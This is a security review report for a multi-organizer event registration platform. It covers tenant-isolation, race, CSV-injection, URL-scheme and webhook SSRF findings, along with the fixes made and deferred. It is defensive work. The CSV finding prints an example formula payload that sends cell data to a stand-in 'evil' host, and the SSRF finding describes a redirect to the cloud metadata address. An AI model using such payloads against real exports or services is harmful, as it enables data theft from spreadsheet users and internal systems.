# Ruflo Security Review — Strawberry Events Platform

**Date:** 2026-06-11
**Branch:** `security/ruflo-review`
**Scope:** Full application security review (multi-organizer, pretix-backed event registration platform)
**Method:** Ruflo CLI (`@claude-flow/cli` v3.10.41) + 8 parallel read-only domain audits + targeted manual verification of 15 high-risk flows.

---

## Executive Summary

**Overall security rating: Soft-launch ready — fix the High item below before exposing the public API to third parties.**

The platform is **well-architected for security**. Authorization is enforced at the **service layer** (not just UI), multi-tenant (org + event) isolation is consistent and fail-closed, secrets are AES-256-GCM encrypted and never returned to clients, production env validation fails fast on weak/missing secrets, QR codes are correctly gated to issued tickets, magic links are unforgeable (HMAC-SHA256 + timing-safe compare), and the outbound-webhook SSRF guard is strong (blocks RFC-1918 / loopback / link-local incl. AWS IMDS, with DNS-rebind protection).

**Biggest risks (all now fixed in this PR or documented for follow-up):**

1. **(High, FIXED)** `GET /api/v1/events` leaked **every organization's** events when an API key had a null `organizationId` (Prisma dropped the `undefined` filter). Now fails closed.
2. **(High, DEFERRED — separate PR)** Single-use email-bound invite has a check-then-set TOCTOU and `register()` performs multi-write side-effects without a transaction. Not exploitable by anonymous users (requires a valid invite link), but can double-redeem under concurrency.
3. **(Medium, FIXED)** CSV formula injection in the registrations export (attendee-controlled name/company/custom fields).
4. **(Medium, FIXED)** Map/WhatsApp URL fields accepted `javascript:`/`data:` schemes (stored-XSS surface on public pages).
5. **(Medium, FIXED)** Outbound webhook `fetch` followed redirects, bypassing the SSRF guard.

**Public deployment:** **Allowed for a controlled soft launch.** The public attendee flows (registration, confirmation, attendee portal, magic links) are safe. Before opening the **`/api/v1` partner API** or running **multiple horizontally-scaled instances**, address the deferred High invite/transaction item and move rate limiting to a shared store (see Deferred).

---

## Ruflo Results

**Commands run:**

```bash
npx @claude-flow/cli@latest doctor          # health: 12 passed, 5 benign warnings
npx @claude-flow/cli@latest security scan   # 0 issues (Critical/High/Medium/Low all 0)
npm audit                                   # 7 vulns (2 low, 5 moderate) — transitive, see Dependencies
```

- **Ruflo version/config:** v3.10.41; config at `.claude-flow/config.yaml`; memory DB at `.swarm/memory.db`. AIDefence (`@claude-flow/aidefence`) loadable.
- **Checks passed (doctor):** version freshness, Node ≥20, npm, Claude CLI, git, repo, config file, memory DB, MCP server config, AIDefence, federation breaker.
- **Warnings (non-blocking):** daemon not running (CLI used directly instead), no API keys configured (LLM routing uses fallbacks), TypeScript not installed at repo root (it is under `apps/web`), agentic-flow optional, encryption-at-rest off for local Ruflo session stores (local dev artifact, not production data).
- **Ruflo `security scan` result:** **0 findings.** Ruflo's scanner is a generic secret/pattern detector; it found no committed secrets or obvious anti-patterns. The substantive findings below come from the manual/agent logic review, which Ruflo's pattern scan does not cover (tenant isolation, QR gating, IDOR, race conditions).
- **MCP daemon note:** the `ruflo` MCP server was unavailable in this environment (`spawn npx ENOENT`; health-gated off). The Ruflo **CLI** ran fine, so the scan/doctor results above are authoritative. No checks were silently skipped.
- **False positives:** none from Ruflo (it reported nothing). The agent audits produced no false positives that survived verification.

---

## Critical Findings

**None.** No Critical-severity issues were found.

---

## High Findings

### H1 — Cross-org event enumeration via null-org API key  ✅ FIXED IN THIS PR
- **Severity:** High (broken access control / multi-tenant isolation)
- **Affected:** `apps/web/src/app/api/v1/events/route.ts`
- **Evidence:** The list query used `organizationId: ctx.organizationId ?? undefined`. Prisma drops `undefined` WHERE keys, so a key with `organizationId === null` matched **all** organizations' events. The single-event resolver (`lib/api/handler.ts`) already guarded this exact case (`if (!ctx.organizationId) throw forbidden`); the list route did not.
- **Exploit:** A key provisioned/left with a null org + `events:read` calls `GET /api/v1/events` and enumerates every org's events (slug, title, visibility).
- **Fix:** Fail closed — return `403 forbidden` when `ctx.organizationId` is null, and filter by the concrete `organizationId` (no `?? undefined`).
- **Status:** **Fixed in this PR.**

### H2 — Single-use invite TOCTOU + non-transactional `register()`  ⏭ DEFERRED (separate PR)
- **Severity:** High (race / atomicity)
- **Affected:** `apps/web/src/lib/registration/service.ts` (invite check ~L107–113, redeem ~L243–250; whole flow L161–288)
- **Evidence:** `register()` reads the invite and checks `redeemedAt === null`, does a full pretix round-trip + seat hold + `attendeeOrder.create`, then marks the invite redeemed with a plain `update({ where: { tokenHash } })` (no `redeemedAt: null` predicate, no transaction). Two concurrent registrations with the same email-bound invite can both pass the check and both create orders. Separately, the local writes (order + invite redeem + custom answers + seat confirm) are not wrapped in `prisma.$transaction`, so a mid-flow crash can orphan seats or leave an un-redeemed invite.
- **Exploit:** Concurrent use of one single-use invite link redeems it N times, defeating the invite-only/seat-cap control. Requires possession of a valid invite link (not anonymous).
- **Recommended fix:** Reserve atomically **before** side effects — `updateMany({ where: { tokenHash, redeemedAt: null }, data: { redeemedAt, redeemedOrderCode: "<reserving>" } })`, proceed only if `count === 1`, then finalize/rollback. Wrap the local writes in `prisma.$transaction`.
- **Status:** **Deferred.** This is the payment-critical path; a correct fix changes ordering + rollback semantics and warrants its own PR with concurrency tests. Documented, not patched here, to honor "no large changes in the security PR."

---

## Medium / Low Findings

### M1 — CSV formula injection in registrations export  ✅ FIXED
- **Affected:** `apps/web/src/lib/admin/registrations.ts` (`buildCsv`), via `…/admin/registrations/export/route.ts`.
- **Evidence:** `esc()` only quoted cells containing `" , \n`; it did not neutralize leading `= + - @ \t \r`. `attendeeName`, `email`, `company`, and folded custom-field answers are attendee-controlled.
- **Exploit:** Attendee sets company = `=HYPERLINK("http://evil/?d="&A1,"x")`; an admin/finance user opening the CSV in Excel/Sheets triggers exfiltration/DDE.
- **Fix:** Prefix any cell starting with a formula char with a single quote. **Fixed + unit test added.**

### M2 — Dangerous URL schemes accepted in map/WhatsApp fields  ✅ FIXED
- **Affected:** `apps/web/src/lib/events/schema.ts` (`mapUrl`, `mapEmbedUrl`, `whatsappChannelUrl`); rendered as `href` / `<iframe src>` on `events/[slug]/page.tsx` and `attendee-state-view.tsx`.
- **Evidence:** `z.string().url()` accepts `javascript:`, `data:`, `vbscript:`. An organizer-set `javascript:` href or `data:text/html` iframe is a stored-XSS/open-redirect vector against public visitors.
- **Fix:** New `httpUrl()` schema helper requires `http(s)://`. **Fixed + unit tests added.** (Host-allowlisting for maps/WhatsApp is a possible further hardening — deferred.)

### M3 — Outbound webhook followed redirects (SSRF guard bypass)  ✅ FIXED
- **Affected:** `apps/web/src/lib/webhooks/service.ts` (`deliver`).
- **Evidence:** `assertSafeWebhookUrl` validated the configured URL, but `fetch` followed 3xx redirects by default — a malicious endpoint could `302` to `http://169.254.169.254/...` and bypass the guard.
- **Fix:** `redirect: "manual"` — 3xx is now recorded as a delivery failure, never followed. **Fixed.**

### M4 — Inbound pretix webhook: no replay protection; single global secret  ⏭ DEFERRED
- **Affected:** `apps/web/src/lib/pretix/webhooks.ts`, `app/api/webhooks/pretix/route.ts`.
- **Evidence:** Auth is a static shared-secret header (`X-Pretix-Webhook-Secret`), no HMAC-over-body, no timestamp/nonce replay defense, one secret for all orgs. Timing-safe compare ✓; fails closed on missing secret ✓; org/event scoped by payload slugs ✓; handlers largely idempotent.
- **Recommended fix:** Add timestamp/delivery-id replay rejection + processed-delivery dedup; prefer HMAC body signature; consider per-organizer secret. **Deferred** (partly depends on pretix capabilities).

### M5 — In-memory rate limiter; public mutations not throttled  ⏭ DEFERRED
- **Affected:** `apps/web/src/lib/security/rate-limit.ts`, `lib/api/rate-limit.ts`; applied to the API-key path and login, **not** to public `register()` / `joinWaitlist`.
- **Evidence:** Per-process `Map` — resets on restart, per-pod under horizontal scaling (effective limit × N), and public registration/waitlist server actions have no per-IP/per-email cap.
- **Recommended fix:** Redis-backed limiter (the code comments already note this) + per-IP/per-email limits on public registration and waitlist. **Deferred.**

### M6 — Broad `onDelete: Cascade` reaches audit logs and sold seats  ⏭ DEFERRED
- **Affected:** `apps/web/prisma/schema.prisma` (EventMapping → seat maps/sections/rows/assignments, invites, waitlist, custom fields; Organization → AuditLog).
- **Evidence:** Deleting an Organization cascades and destroys its **audit trail**; deleting an EventMapping erases sold-seat state. No soft-delete/tombstone.
- **Recommended fix:** `onDelete: Restrict` (or `SetNull`) for AuditLog and sold SeatAssignment; soft-delete for EventMapping/Organization. **Deferred** (schema migration + product decision).

### L1 — Waitlist position assigned via read-max-then-increment (race)  ⏭ DEFERRED
- `apps/web/src/lib/waitlist/service.ts` — concurrent joins can get duplicate positions; idempotency check is also racy. Fix with a unique constraint + retry or a transaction. Data-integrity only (no security bypass).

### L2 — Magic-link / invite tokens never expire and are not revocable  ⏭ DEFERRED
- `apps/web/src/lib/tokens/magic-link.ts` — signed over the order code with no `exp`/nonce; a leaked `/t/<token>` URL grants permanent access (PII + live QR once issued). Invite tokens support optional `exp` but it isn't required. Fix: add issued-at/expiry claim or a per-order token version for revocation. (Aligns with the deferred cancel/revoke gap.)

### L3 — `register()` did not require `liveOnPretix`  ✅ FIXED
- `apps/web/src/lib/registration/service.ts` — the public detail page requires `liveOnPretix: true` but `register()` only required `visibility: "public"`, so a direct call could register against a not-yet-live event. **Fixed** (added `liveOnPretix: true` to the lookup).

### L4 — Webhook retries ignored the `active` flag  ✅ FIXED
- `apps/web/src/lib/webhooks/service.ts` (`retryDue`) re-delivered queued failures even after the webhook was disabled. **Fixed** (`webhook: { active: true }` in the where-clause).

### L5 — Audit log reads lack an explicit role gate  ⏭ DEFERRED
- `apps/web/src/lib/audit/service.ts` `query`/`getEntry` are org-scoped but not role-gated; `getDashboard` embeds `recentAudit` and `getRegistrationDetail` returns an order's audit trail, both reachable by **finance**. Org-scoped (no cross-org leak) and exposes action/timestamp metadata only (no secrets). Fix: assert `organizer_admin`/`super_admin` in the audit service. **Deferred** (Low; touches dashboard payload shaping).

### L6 — Misc hygiene  ⏭ DEFERRED
- CSP uses `script-src 'unsafe-inline'` in production (move to nonce-based) — `lib/security/headers.ts`.
- Duplicated/misnamed secret resolver: `MAGIC_LINK_SECRET || WEBHOOK_SECRET` fallback where env validation checks `PRETIX_WEBHOOK_SECRET` — harmless (prod throws without a strong `MAGIC_LINK_SECRET`) but worth centralizing.
- Custom-field `value` has no server-side `.max()` length bound.
- API-key `hashesEqual` (timing-safe helper) is dead code — auth uses a hashed-index lookup (acceptable; the hash neutralizes the timing oracle). Remove or document.

---

## Permission / Isolation Findings (dedicated)

**Verdict: strong and fail-closed.** Authorization lives in the service layer; server actions are thin wrappers that call `getSessionContext()` + a role/scope guard; route handlers not covered by a layout (CSV export) re-check auth themselves.

- **Roles:** `assertCanManageEvents` restricts event/ticket/quota/cover/invite mutation to `super_admin`/`organizer_admin` (finance & check-in excluded). Finance order actions require `finance`/`organizer_admin`. API-key/webhook/SMTP management require `organizer_admin` for the specific org. All guards also block `impersonating` sessions.
- **Org/event scope:** All registration/finance/approval reads funnel through `orderScope`/`eventScope`/`canAccessEvent`; non-super users with no membership match `{ id: "__never__" }` (fail-closed). Single-record reads load by id then verify `canAccessEvent` against the record's `organizationId` — no id-only IDOR found.
- **CSV export** re-checks role and applies `orderScope`; an attacker-supplied `event` filter is intersected with scope (cannot widen). QR/secret material is never exported.
- **Active-org cookie** is a display/creation-target convenience only; data queries scope by membership, so a forged cookie cannot widen access. `setActiveOrg` rejects non-super users.
- **Note (L5):** audit reads lack a role gate (finance can see org-scoped audit metadata).

**Manual checks:** #1 Finance cannot edit events/tickets/quotas — **SAFE**. #2 Check-in staff cannot reach finance/admin secrets — **SAFE**. #3 Org A admin cannot read Org B registrations — **SAFE**. #11 CSV export respects org/event scope — **SAFE**. #12 Suspended user blocked from protected pages — **SAFE** (status re-checked from DB every request; JWT carries only `userId`).

---

## API / Webhook Findings (dedicated)

**API `/api/v1`:** Per-route API-key auth; expired/revoked keys rejected before scope/rate checks; read-vs-write scopes enforced (no wildcard bypass); event-scoped keys cannot reach other events; **all DELETE/PUT/PATCH/unused-POST return 405** (no destructive deletes reachable); DTOs whitelist fields and never leak `pretixSecret`, magic-link tokens, or internal secrets; health endpoints expose only coarse ok/error. The one isolation gap (H1, null-org list leak) is **fixed**. Rate limiting is structurally sound but in-memory (M5).

**Webhooks — inbound:** timing-safe secret check, fails closed, body parsed only after auth, org/event scoped by payload slugs. Gaps: replay protection + per-org/HMAC secret (M4).
**Webhooks — outbound:** per-endpoint HMAC-SHA256 signing with timestamp; strong SSRF guard (RFC-1918/loopback/link-local incl. 169.254.169.254 + DNS-rebind), re-validated at delivery; secrets shown once on create/rotate and never in the list/logs; disabled webhooks excluded from emission. Redirect-follow bypass (M3) and retry-ignores-active (L4) are **fixed**.

**Manual checks:** #4 API key Org A → Org B — **SAFE** (after H1 fix). #5 event-scoped key → other event — **SAFE**. #13 DELETE returns 405 — **SAFE**.

---

## Secrets / Env Findings (dedicated)

**Verdict: SAFE.** AES-256-GCM (`lib/crypto.ts`) with a fresh 12-byte random IV per call, auth tag verified on decrypt, key sourced only from `ENCRYPTION_KEY` (base64, exactly 32 bytes; no fallback). Integration secrets (WhatsApp/SMS/Whish/pretix tokens, SMTP password) are encrypted at rest and surfaced only as `*Configured: boolean` — **never returned** to client/API/UI. API keys: only hash + prefix stored, raw shown once. Audit and email logs persist identifiers/metadata only — **no secrets**. Production env validation (`lib/config/env.ts`, wired at boot via `instrumentation.ts`) fails fast on missing/weak/short secrets and non-HTTPS `APP_URL`, echoing variable **names only**. `git ls-files` shows only `.env.example` / `.env.production.example` committed — no real `.env`. Email transport has no unsafe prod fallback (returns `disabled`, not console transport; startup fails unless explicitly allowed).

**Manual checks:** #14 integration secrets encrypted & never returned — **SAFE**. #15 audit logs contain no secrets — **SAFE** (note: the generic `record(before, after)` channel is unused by any secret path — a latent footgun worth a review guard).

---

## Dependency Findings

```
npm audit → 7 vulnerabilities (2 low, 5 moderate); 0 high, 0 critical
```
All are **transitive** via the Next.js toolchain:
- `next` (postcss `<8.5.10` XSS in CSS stringify — moderate) and dependents `next-intl`, `next-auth`/`@auth/core`, `nodemailer`.
- The only offered fix is `npm audit fix --force`, which downgrades `next` to `9.x` — a **breaking** change.

**Decision:** **Not auto-upgraded** (would break the app; no safe non-breaking fix available). These are low/moderate, mostly build-time (postcss) or require specific exploitation conditions. **Recommend:** upgrade to a patched Next.js minor when available and re-run `npm audit`. Tracked as a follow-up, not a deployment blocker.

---

## Manual QA Results

| # | Check | Result |
|---|-------|--------|
| 1 | Finance cannot edit events/tickets/quotas by direct call | ✅ SAFE |
| 2 | Check-in staff cannot access finance/admin secrets | ✅ SAFE |
| 3 | Org A admin cannot access Org B registrations | ✅ SAFE |
| 4 | API key Org A cannot access Org B | ✅ SAFE (H1 fixed; was leaking via list route) |
| 5 | Event-scoped API key cannot access another event | ✅ SAFE |
| 6 | Pending-approval ticket cannot show QR | ✅ SAFE |
| 7 | Pending-COD/payment ticket cannot show QR | ✅ SAFE |
| 8 | Rejected ticket cannot show QR | ✅ SAFE |
| 9 | Magic link for one attendee cannot access another | ✅ SAFE |
| 10 | Email resend cannot resend cross-org emails | ✅ SAFE (org-scoped admin guard) |
| 11 | CSV export respects org/event scope | ✅ SAFE |
| 12 | Suspended user cannot access protected pages | ✅ SAFE |
| 13 | DELETE endpoints return 405 | ✅ SAFE |
| 14 | Integration secrets encrypted and never returned | ✅ SAFE |
| 15 | Audit logs do not contain secrets | ✅ SAFE |

---

## Fixes Included in This PR

| Finding | Severity | File | Test |
|---------|----------|------|------|
| H1 cross-org event list leak | High | `app/api/v1/events/route.ts` | (covered by existing api-auth tests + reasoning) |
| M1 CSV formula injection | Medium | `lib/admin/registrations.ts` | ✅ `registrations.test.ts` |
| M2 dangerous URL schemes | Medium | `lib/events/schema.ts` | ✅ `schema.test.ts` |
| M3 webhook redirect SSRF | Medium | `lib/webhooks/service.ts` | (behavioral — `redirect: "manual"`) |
| L3 register() liveOnPretix guard | Low | `lib/registration/service.ts` | (one-line where-clause) |
| L4 webhook retries ignore active | Low | `lib/webhooks/service.ts` | (where-clause) |
| (lint) prefer-const in register page | — | `events/[slug]/register/page.tsx` | — |

---

## Validation Results

| Gate | Result |
|------|--------|
| `tsc --noEmit` | ✅ clean |
| `vitest run` | ✅ 540 passed / 36 skipped |
| `vitest run smoke …` | ✅ 15 passed |
| `eslint` | ✅ 0 errors (1 pre-existing unused-var **warning** in a test) |
| `next build` | ✅ success |
| `npm audit` | ⚠ 7 transitive (2 low, 5 moderate) — documented, no safe fix |
| Ruflo `security scan` | ✅ 0 issues |
| Ruflo `doctor` | ✅ 12 passed / 5 benign warnings |

---

## Final Recommendation

- **Can this be deployed publicly?** **Yes, for a controlled soft launch.** All public attendee-facing flows (registration, confirmation, attendee portal, magic links, QR gating) are secure, and tenant isolation holds.
- **What must be fixed first (before opening the partner `/api/v1` to third parties or scaling horizontally):**
  - H2 — invite TOCTOU + `register()` transaction (dedicated PR with concurrency tests).
  - M5 — shared (Redis) rate limiter + per-IP/email limits on public registration/waitlist.
- **What can be deferred:** M4 (webhook replay/HMAC), M6 (cascade-delete/soft-delete + audit retention), L1 (waitlist race), L2 (magic-link expiry/revocation), L5 (audit role gate), L6 (CSP nonce, secret-resolver cleanup, field length caps), and the transitive `npm audit` items (upgrade Next.js when a patched minor lands).

**Go / No-Go:** **GO for soft launch.** **No-Go for public partner API / multi-instance scale** until H2 and M5 are addressed.
